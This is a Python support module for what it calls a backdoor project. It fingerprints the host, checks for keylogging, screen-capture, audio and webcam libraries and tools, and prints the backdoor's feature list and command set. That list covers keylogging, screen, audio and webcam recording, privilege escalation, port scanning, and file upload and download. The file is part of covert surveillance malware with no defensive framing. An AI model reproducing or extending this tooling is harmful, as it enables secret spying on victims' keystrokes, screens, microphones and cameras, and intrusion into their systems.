"""
Utility functions for the backdoor project
Includes environment checks and configuration handling
"""

import os
import sys
import platform
import socket


def check_environment():
    """Check if the environment is suitable for running the backdoor"""
    info = {
        'python_version': sys.version,
        'platform': platform.platform(),
        'system': platform.system(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'hostname': socket.gethostname(),
    }
    return info


def check_dependencies():
    """Check which optional dependencies are available"""
    dependencies = {
        'pynput': False,
        'PIL': False,
        'pyautogui': False,
        'pyaudio': False,
        'cv2': False,
        'mss': False,
        'imageio': False,
        'numpy': False,
    }
    
    # Try importing each dependency
    try:
        import pynput
        dependencies['pynput'] = True
    except ImportError:
        pass
    
    try:
        from PIL import Image
        dependencies['PIL'] = True
    except ImportError:
        pass
    
    try:
        import pyautogui
        dependencies['pyautogui'] = True
    except ImportError:
        pass
    
    try:
        import pyaudio
        dependencies['pyaudio'] = True
    except ImportError:
        pass
    
    try:
        import cv2
        dependencies['cv2'] = True
    except ImportError:
        pass
    
    try:
        from mss import mss
        dependencies['mss'] = True
    except ImportError:
        pass
    
    try:
        import imageio
        dependencies['imageio'] = True
    except ImportError:
        pass
    
    try:
        import numpy
        dependencies['numpy'] = True
    except ImportError:
        pass
    
    return dependencies


def check_system_tools():
    """Check for available system tools (ffmpeg, screencapture, etc.)"""
    tools = {
        'ffmpeg': False,
        'screencapture': False,
        'scrot': False,
        'sox': False,
        'arecord': False,
    }
    
    import subprocess
    
    def command_exists(cmd):
        try:
            if platform.system() == 'Windows':
                result = subprocess.call(f'where {cmd}', shell=True, 
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                result = subprocess.call(f'which {cmd}', shell=True,
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return result == 0
        except:
            return False
    
    tools['ffmpeg'] = command_exists('ffmpeg')
    tools['screencapture'] = command_exists('screencapture')
    tools['scrot'] = command_exists('scrot')
    tools['sox'] = command_exists('sox')
    tools['arecord'] = command_exists('arecord')
    
    return tools


def print_status():
    """Print environment and dependency status"""
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║         Enhanced Backdoor Environment Check                   ║")
    print("╚═══════════════════════════════════════════════════════════════╝\n")
    
    print("=== System Environment ===")
    env = check_environment()
    for key, value in env.items():
        print(f"{key}: {value}")
    
    print("\n=== Python Dependencies ===")
    deps = check_dependencies()
    for dep, available in deps.items():
        status = "✓ Available" if available else "✗ Not installed"
        print(f"{dep:15s}: {status}")
    
    print("\n=== System Tools ===")
    tools = check_system_tools()
    for tool, available in tools.items():
        status = "✓ Available" if available else "✗ Not found"
        print(f"{tool:15s}: {status}")
    
    print("\n╔═══════════════════════════════════════════════════════════════╗")
    print("║                  Feature Availability                         ║")
    print("╚═══════════════════════════════════════════════════════════════╝\n")
    
    # Keylogger
    if deps['pynput']:
        print("✓ Keylogger: Full functionality (pynput)")
    else:
        print("⚠ Keylogger: Fallback mode only (manual logging)")
    
    # Screenshots
    if deps['PIL'] or deps['pyautogui']:
        print("✓ Screenshots: Full functionality (PIL/pyautogui)")
    elif tools['screencapture'] or tools['scrot']:
        print("⚠ Screenshots: System commands available")
    else:
        print("✗ Screenshots: Limited functionality")
    
    # Screen Recording
    if deps['cv2'] and (deps['PIL'] or deps['pyautogui']):
        print("✓ Screen Recording: Full functionality (OpenCV)")
    elif deps['mss'] and deps['imageio']:
        print("✓ Screen Recording: MSS + imageio method")
    elif tools['ffmpeg']:
        print("⚠ Screen Recording: ffmpeg available (system command)")
    else:
        print("⚠ Screen Recording: Screenshot fallback only")
    
    # Audio Recording
    if deps['pyaudio']:
        print("✓ Audio Recording: Full functionality (pyaudio)")
    elif tools['sox'] or tools['arecord']:
        print("⚠ Audio Recording: System commands available")
    else:
        print("✗ Audio Recording: Not available")
    
    # Webcam Capture
    if deps['cv2']:
        print("✓ Webcam Capture: Full functionality (opencv-python)")
    else:
        print("✗ Webcam Capture: Not available (requires opencv-python)")
    
    # Network Discovery
    print("✓ Network Discovery: Always available (built-in)")
    
    # Privilege Escalation
    print("✓ Privilege Escalation: Always available (built-in)")
    
    print("\n╔═══════════════════════════════════════════════════════════════╗")
    print("║                Installation Recommendations                   ║")
    print("╚═══════════════════════════════════════════════════════════════╝\n")
    
    missing = []
    if not deps['pynput']:
        missing.append("pynput (for keylogger)")
    if not deps['PIL']:
        missing.append("Pillow (for screenshots)")
    if not deps['cv2']:
        missing.append("opencv-python (for webcam & screen recording)")
    if not deps['pyaudio']:
        missing.append("pyaudio (for audio recording)")
    if not deps['numpy']:
        missing.append("numpy (for advanced features)")
    
    if missing:
        print("Missing packages for full functionality:")
        for pkg in missing:
            print(f"  - {pkg}")
        print("\nInstall all recommended packages:")
        print("  pip install -r requirements.txt")
    else:
        print("✓ All recommended packages installed!")
    
    if not tools['ffmpeg']:
        print("\nOptional system tool:")
        print("  - ffmpeg (for enhanced screen recording)")
        print("    Install: brew install ffmpeg (macOS)")
        print("           : apt-get install ffmpeg (Linux)")
    
    print("\n╔═══════════════════════════════════════════════════════════════╗")
    print("║                    Current Features                           ║")
    print("╚═══════════════════════════════════════════════════════════════╝\n")
    
    features = [
        "KEYLOGGER:",
        "  - keylog_start, keylog_stop, keylog_dump",
        "  - keylog_status, keylog_clear, keylog_manual",
        "",
        "PRIVILEGE ESCALATION:",
        "  - priv_check, priv_enum, priv_services",
        "  - priv_tasks, priv_sensitive",
        "",
        "SCREENSHOTS:",
        "  - screenshot, screenshot_multi, screenshot_list",
        "",
        "SCREEN RECORDING:",
        "  - record_screen, record_start, record_stop",
        "  - record_status, record_list",
        "",
        "AUDIO RECORDING:",
        "  - audio_record, audio_stop, audio_list",
        "",
        "WEBCAM CAPTURE:",
        "  - webcam_snap, webcam_list",
        "",
        "NETWORK DISCOVERY:",
        "  - net_info, net_scan, net_connections",
        "  - net_portscan, net_public_ip, net_check_internet",
        "",
        "BASIC COMMANDS:",
        "  - cd, download, upload, sysinfo, help",
    ]
    
    for feature in features:
        print(feature)


if __name__ == "__main__":
    print_status()
